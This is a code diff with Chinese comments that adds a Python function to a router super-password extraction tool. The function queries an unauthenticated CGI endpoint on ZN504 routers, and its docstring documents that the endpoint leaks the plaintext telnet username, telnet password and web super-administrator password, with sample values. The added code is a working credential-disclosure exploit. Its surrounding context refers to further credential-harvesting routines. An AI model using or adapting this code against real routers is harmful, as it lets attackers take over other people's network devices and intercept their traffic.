@@ -155,6 +155,36 @@ def fetch_supass_via_dumpdatamodel(opener, router_ip, profile, verbose=False):
     return found
 
 
+def fetch_supass_via_getgateway(router_ip, mgmt_port=8080, timeout=15):
+    """ZN504 专属：GET /cgi-bin/getGateWay.cgi 无需认证直接返回明文凭据。
+
+    返回字段按 <br> 分割（共 5 行）：
+      [0] Family GateWay
+      [1] telnet 用户名（如 telnetadmin）
+      [2] telnet 密码（如 telnetadmin）
+      [3] Yes/No（telnet 开关状态）
+      [4] Web 超密（如 nE7jA%5m）
+
+    返回 (telnet_user, telnet_pass, web_pass) 三元组；失败返回 (None, None, None)。
+    """
+    url = f"http://{router_ip}:{mgmt_port}/cgi-bin/getGateWay.cgi"
+    try:
+        with urllib.request.urlopen(url, timeout=timeout) as resp:
+            data = resp.read().decode("gb2312", "ignore")
+    except Exception:
+        return None, None, None
+
+    # 按 <br> 分割取有效行
+    lines = [l.strip() for l in re.split(r"<br\s*/?>", data) if l.strip()]
+    if len(lines) < 5:
+        return None, None, None
+
+    telnet_user = lines[1] if len(lines) > 1 else None
+    telnet_pass = lines[2] if len(lines) > 2 else None
+    web_pass = lines[4] if len(lines) > 4 else None
+    return telnet_user, telnet_pass, web_pass
+
+
 def _scan_bytes(data, found):
     """对字节流做正则扫描，候选追加到 found。"""
     for pat in _SU_PATTERNS:
